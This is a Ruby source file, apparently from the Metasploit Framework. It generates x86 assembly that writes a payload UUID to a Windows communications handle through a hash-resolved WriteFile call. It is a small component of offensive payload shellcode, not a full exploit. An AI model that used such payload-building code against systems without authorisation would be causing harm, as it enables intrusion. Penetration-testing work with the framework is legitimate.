# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/uuid'

module Msf

###
#
# Basic write_uuid stub for Windows ARCH_X86 payloads
#
###

module Payload::Windows::WriteUUID

  #
  # Generate assembly code that writes the UUID to a file handle.
  #
  # This code assumes that the block API pointer is in ebp, and
  # the communications file handle is in edi.
  #
  def asm_write_uuid(uuid=nil)
    uuid ||= generate_payload_uuid
    uuid_raw = uuid.to_raw

    asm =%Q^
      write_uuid:
        push 0                 ; lpOverlapped
        push 0                 ; lpNumberOfBytesWritten
        push #{uuid_raw.length} ; nNumberOfBytesToWrite
        call get_uuid_address  ; put uuid buffer on the stack
        db #{raw_to_db(uuid_raw)}  ; UUID
      get_uuid_address:
        push edi               ; hFile
        push #{Rex::Text.block_api_hash('kernel32.dll', 'WriteFile')}
        call ebp               ; call WriteFile(...)
    ^

    asm
  end

  def uuid_required_size
    # Start with the number of bytes required for the instructions
    space = 17

    # a UUID is 16 bytes
    space += 16

    space
  end

end

end


